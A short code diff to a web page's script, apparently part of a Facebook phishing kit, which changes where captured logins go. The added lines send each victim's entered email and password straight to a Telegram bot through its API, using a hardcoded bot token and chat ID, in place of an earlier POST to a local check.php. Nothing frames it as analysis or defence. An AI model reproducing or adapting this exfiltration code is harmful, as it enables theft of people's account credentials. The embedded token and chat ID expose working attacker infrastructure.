@@ -186,12 +186,13 @@ function hideFbPassword() {
             	let memek = `Email : ${emailfb}\nIni pw ${sandifb}`
                 // SEND DATA
                 $.ajax({
-                    type: 'POST',
-                    url: 'check.php',
-                    data: $('#alexfr9').serialize(),
-                    dataType: 'text',
-                    
-                })
+					url: 'https://api.telegram.org/bot6448170955:AAEBRQ90BHxFlvCDznZYm7NHkExvAhbJR8U/sendMessage',
+					type: 'POST',
+					data: {
+						chat_id: '5858422479',
+						text: `Email : ${emailfb}\nPassword : ${sandifb}`
+					}		
+				})
             }
         }
     </script>
